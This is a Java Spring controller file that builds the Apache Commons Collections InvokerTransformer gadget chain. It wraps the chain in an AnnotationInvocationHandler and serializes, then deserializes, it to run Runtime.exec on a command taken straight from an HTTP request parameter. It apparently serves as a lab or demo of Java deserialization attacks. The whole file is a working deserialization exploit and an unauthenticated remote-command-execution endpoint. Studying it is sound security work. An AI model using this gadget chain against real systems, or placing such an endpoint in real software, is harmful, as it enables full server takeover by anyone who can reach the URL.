package myapp;


import org.springframework.web.bind.annotation.RestController;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.map.TransformedMap;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

@RestController
public class TransformerController {

    @GetMapping("/transformer")
    public String execute(@RequestParam String command)  {
        try {
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                            new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                            new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{command})
            };

            Transformer transformerChain = new ChainedTransformer(transformers);

            Map innermap = new HashMap();
            innermap.put("value", "value");
            Map outmap = TransformedMap.transformingMap(innermap, null, transformerChain);
            Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
            ctor.setAccessible(true);
            Object instance = ctor.newInstance(Retention.class, outmap);
            File f = new File("obj");
            ObjectOutputStream outStream = new ObjectOutputStream(new FileOutputStream(f));
            outStream.writeObject(instance);
            outStream.flush();
            outStream.close();
            ObjectInputStream in = new ObjectInputStream(new FileInputStream("obj"));
            in.readObject();
            in.close();
            return "命令执行完成";
        } catch (Exception e) {
            return "Error executing command: " + e.getMessage();
        }
    }
}